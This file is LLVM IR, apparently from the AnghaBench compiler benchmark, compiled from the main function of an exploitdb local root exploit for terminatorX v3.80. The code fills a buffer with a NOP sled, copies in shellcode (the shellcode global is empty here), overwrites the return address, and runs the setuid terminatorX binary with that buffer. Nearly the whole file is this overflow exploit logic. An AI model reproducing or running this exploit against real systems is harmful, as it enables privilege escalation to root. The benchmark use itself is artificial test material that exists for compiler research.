; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23352.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23352.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@ret = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [2 x i8] c"A\00", align 1
@.str.1 = private unnamed_addr constant [103 x i8] c"\0AterminatorX v3.80 - local root exploit by m00 Security / Over_G\0A    \09  www.m00.ru\09\09OverG[at]mail.ru\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"Using ret: 0x%08x \0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"/usr/local/bin/terminatorX\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"terminatorX\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-f\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1266 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %9 = load i8**, i8*** %5, align 8
  %10 = getelementptr inbounds i8*, i8** %9, i64 1
  %11 = load i8*, i8** %10, align 8
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %21

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 1
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 @atoi(i8* %16)
  store i32 %17, i32* %7, align 4
  %18 = load i32, i32* @ret, align 4
  %19 = load i32, i32* %7, align 4
  %20 = sub nsw i32 %18, %19
  store i32 %20, i32* @ret, align 4
  br label %21

21:                                               ; preds = %13, %2
  store i32 0, i32* %6, align 4
  br label %22

22:                                               ; preds = %32, %21
  %23 = load i32, i32* %6, align 4
  %24 = load i8*, i8** @shellcode, align 8
  %25 = call i32 @strlen(i8* %24)
  %26 = sub nsw i32 259, %25
  %27 = icmp slt i32 %23, %26
  br i1 %27, label %28, label %35

28:                                               ; preds = %22
  %29 = load i32, i32* %6, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [1266 x i8], [1266 x i8]* %8, i64 0, i64 %30
  store i8 -112, i8* %31, align 1
  br label %32

32:                                               ; preds = %28
  %33 = load i32, i32* %6, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %6, align 4
  br label %22

35:                                               ; preds = %22
  %36 = getelementptr inbounds [1266 x i8], [1266 x i8]* %8, i64 0, i64 0
  %37 = getelementptr inbounds i8, i8* %36, i64 259
  %38 = load i8*, i8** @shellcode, align 8
  %39 = call i32 @strlen(i8* %38)
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %37, i64 %41
  %43 = load i8*, i8** @shellcode, align 8
  %44 = load i8*, i8** @shellcode, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = call i32 @memcpy(i8* %42, i8* %43, i32 %45)
  %47 = getelementptr inbounds [1266 x i8], [1266 x i8]* %8, i64 0, i64 0
  %48 = getelementptr inbounds i8, i8* %47, i64 259
  %49 = call i32 @memcpy(i8* %48, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i32 1)
  %50 = getelementptr inbounds [1266 x i8], [1266 x i8]* %8, i64 0, i64 0
  %51 = getelementptr inbounds i8, i8* %50, i64 260
  %52 = call i32 @memcpy(i8* %51, i8* bitcast (i32* @ret to i8*), i32 4)
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.1, i64 0, i64 0))
  %54 = load i32, i32* @ret, align 4
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i32 %54)
  %56 = getelementptr inbounds [1266 x i8], [1266 x i8]* %8, i64 0, i64 0
  %57 = call i32 @execl(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %56, i32* null)
  %58 = load i32, i32* %3, align 4
  ret i32 %58
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
